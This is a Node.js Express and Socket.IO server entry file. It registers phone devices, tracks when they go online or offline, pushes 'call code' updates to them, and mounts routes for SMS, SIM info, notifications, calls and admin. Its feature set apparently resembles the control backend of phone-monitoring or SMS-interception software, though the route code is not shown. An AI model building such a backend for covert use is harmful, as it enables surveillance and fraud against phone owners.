import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] } });

app.use(cors());
app.use(express.json());
app.set("io", io);

// ✅ Maintain device sockets
const deviceSockets = new Map();

// 🧩 SOCKET.IO Logic
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;
    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);
    console.log(`📱 Registered Device: ${uniqueid}`);
    saveLastSeen(uniqueid, "Online");
  });

  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;
    console.log(`⚡ ${uniqueid} → ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);
    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
  });

  socket.on("disconnect", () => {
    console.log("🔴 Disconnected:", socket.id);
    if (currentDeviceId) {
      console.log(`📴 ${currentDeviceId} went Offline`);
      deviceSockets.delete(currentDeviceId);
      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });
      saveLastSeen(currentDeviceId, "Offline");
      currentDeviceId = null;
    }
  });
});

// 🔔 Function to emit call-code updates
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId) {
    console.log(`📤 Sending call code to ${uniqueid}:`, callData);
    io.to(socketId).emit("callCodeUpdate", callData);
  } else {
    console.warn(`⚠️ Device ${uniqueid} is offline.`);
  }
}

async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

app.get("/", (req, res) => res.send("🚀 Devices API with Live Socket Running!"));
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);

app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
